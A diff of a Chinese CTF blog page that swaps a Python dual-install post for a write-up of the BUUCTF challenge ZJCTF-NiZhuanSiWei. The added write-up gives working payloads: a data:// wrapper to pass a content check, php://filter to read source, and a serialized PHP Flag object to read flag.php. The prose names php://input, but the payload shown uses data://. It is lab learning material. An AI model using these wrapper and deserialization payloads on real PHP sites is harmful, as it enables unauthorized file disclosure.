@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title>Python安装双版本 | 大周&#39;blog</title>
+  <title>ZJCTF-NiZhuanSiWei | 大周&#39;blog</title>
   <meta name="description" content="ctf萌新" />
   <meta name="keywords" content="ctf,菜鸡,萌新,web,Sakura" />
   
@@ -231,8 +231,8 @@
         <!--<div class="toc-entry-content"> <!-- 套嵌目录使用（主要为了支援评论）-->
         
           <header class="entry-header">
-            <h1 class="entry-title">Python安装双版本</h1>
-            <p class="entry-census">&nbsp;·&nbsp;2020-3-15&nbsp;
+            <h1 class="entry-title">ZJCTF-NiZhuanSiWei</h1>
+            <p class="entry-census">&nbsp;·&nbsp;2020-7-8&nbsp;
               
                     
         ·<span id="readcount"></span>次阅读
@@ -242,19 +242,44 @@
           </header>
         
         <div class="entry-content">
-          <p>Python的环境部署一直是有问题，今天就想个办法把这个问题解决了</p>
-<p>同时安装Python2和Python3的版本并配置环境变量</p>
+          <p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p>
 <a id="more"></a>
 
-<p>在官网下载Python2和Python3的安装包</p>
-<p>安装Python2和Python3的时候都勾选add to path(配置环境变量)</p>
-<p>然后在Python2文件夹里把python.exe改为python2.exe</p>
-<p>同理在scripts文件夹下把pip.exe分别改为pip2.exe</p>
-<p>这个时候测试的话pip2 -V命令会报错</p>
-<p>我们在官网下载pip安装包，cmd中cd命令进入安装文件</p>
-<p>然后python2 setup.py install</p>
-<p><img src="/2020/03/15/Python%E5%AE%89%E8%A3%85%E5%8F%8C%E7%89%88%E6%9C%AC/1.png" alt="1"></p>
-<p>ok！</p>
+<p><img src="/2020/07/08/ZJCTF-NiZhuanSiWei/1.png" alt="1"></p>
+<p>首先要满足传入一个text文件，使文件内容为welcome to the zjctf，可以用php://input伪协议</p>
+<pre><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code></pre><p>接下来过滤了flag，并且提示有个useless.php文件，使用php://filter协议读取</p>
+<pre><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></pre><p><img src="/2020/07/08/ZJCTF-NiZhuanSiWei/2.png" alt="2"></p>
+<p>base64解码得道useless.php的内容</p>
+<pre><code>&lt;?php  
+
+class Flag{  //flag.php  
+    public $file;  
+    public function __tostring(){  
+        if(isset($this-&gt;file)){  
+            echo file_get_contents($this-&gt;file); 
+            echo &quot;&lt;br&gt;&quot;;
+        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);
+        }  
+    }  
+}  
+?&gt;  </code></pre><p>然后序列化</p>
+<pre><code>&lt;?php  
+class Flag{
+    public $file=&#39;flag.php&#39;;  
+    public function __tostring(){  
+        if(isset($this-&gt;file)){  
+            echo file_get_contents($this-&gt;file); 
+            echo &quot;&lt;br&gt;&quot;;
+        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);
+        }  
+    }  
+} 
+$password=new Flag();
+$password = serialize($password);
+echo $password; 
+?&gt;</code></pre><p>得到<code>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p>
+<p>最终payload</p>
+<pre><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></pre><p>源代码得到flag</p>
 
         </div>
         <!-- .entry-content -->
@@ -276,39 +301,20 @@
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2020/03/15/php%E5%AD%A6%E4%B9%A0day4/" rel="prev">
-              <div class="background">
-<!--                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">-->
-                
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/1ac3fa3ef82c93a8d46384e256342711.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                php学习day4</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
         
           
-            <div class="post-nepre half next">
+            <div class="post-nepre full next">
           
-            <a href="/2020/03/14/php%E5%AD%A6%E4%B9%A0day3/" rel="next">
+            <a href="/2020/07/07/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-BuyFlag/" rel="next">
               <div class="background">
                 
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/783bf161f47b32882f0e962fd4064de7.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/19313b0d62b27c8ba022f60fbfedd5ee.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                php学习day3</h3>
+                极客大挑战2019-BuyFlag</h3>
                 <hr>
               </div>
             </a>
